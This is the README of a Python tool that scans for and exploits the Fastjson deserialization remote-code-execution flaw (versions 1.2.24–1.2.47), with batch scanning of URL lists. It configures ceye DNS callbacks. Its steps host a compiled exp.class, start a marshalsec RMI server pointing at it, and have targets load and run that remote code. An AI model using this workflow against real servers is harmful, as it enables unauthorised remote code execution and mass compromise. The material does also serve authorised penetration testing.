# Fastjson_Rce
fastjson_rce：xray's gadget！
## 一 说明

- 可检测利用版本：1.2.24-1.2.47

- 实现：单个目标检测、批量目标检测、单个目标利用。

- 使用之前：

  修改代码56行的ceye地址。

  eg：

  `rmi_url = 'rmi://%s.your-ceye_domain/index' % random_str`

  修改代码84行的ceye-token

  eg：

  `http://api.ceye.io/v1/records?token=your-ceye_token&type=dns&filter=`

## 二 使用参数

```powershell
python3 .\check_fastjson.py -h
usage: check_fastjson.py [-h] [-u URL] [-l LIST] [-i INDEX] [-s SAVE]
                         [-t EXPOLOIT_TARGET] [-r RMISERVER]

fastjson批量漏洞检测利用

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     单个需要检测的漏洞url
  -l LIST, --list LIST  批量检测的url列表 eg：url.txt
  -i INDEX, --index INDEX
                        Payload 索引号
  -s SAVE, --save SAVE  存在漏洞url保存的文件名 eg: Vul_url.txt
  -t EXPOLOIT_TARGET, --expoloit_target EXPOLOIT_TARGET
                        漏洞利用目标
  -r RMISERVER, --rmiserver RMISERVER
                        使用marshalsec-0.0.3-SNAPSHOT-all.jar
                        开启的rmi服务地址。eg：rmi://127.0.0.1/exp
```

## 三 利用说明

检测

`python3 check_fastjson.py -u 目标url `   or  `python3 check_fastjson.py -l 目标txt -s 保存结果txt`

返回 payload索引号

利用前需在vps开启http和rmi服务

http目录下放编译好的exp.class

`python3 -m http.server 1234`

使用marshalsec开启rmi服务

`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://1.1.1.1:1234/#exp" 9999`

利用

`python3 check_fastjson.py -t 目标target -r rmi://1.1.1.1:9999/exp -i payload索引号 `  

查看返回结果

## 四 参考

[ https://zhuanlan.zhihu.com/p/99075925 ]()

[ https://github.com/zhzyker/exphub.git]()

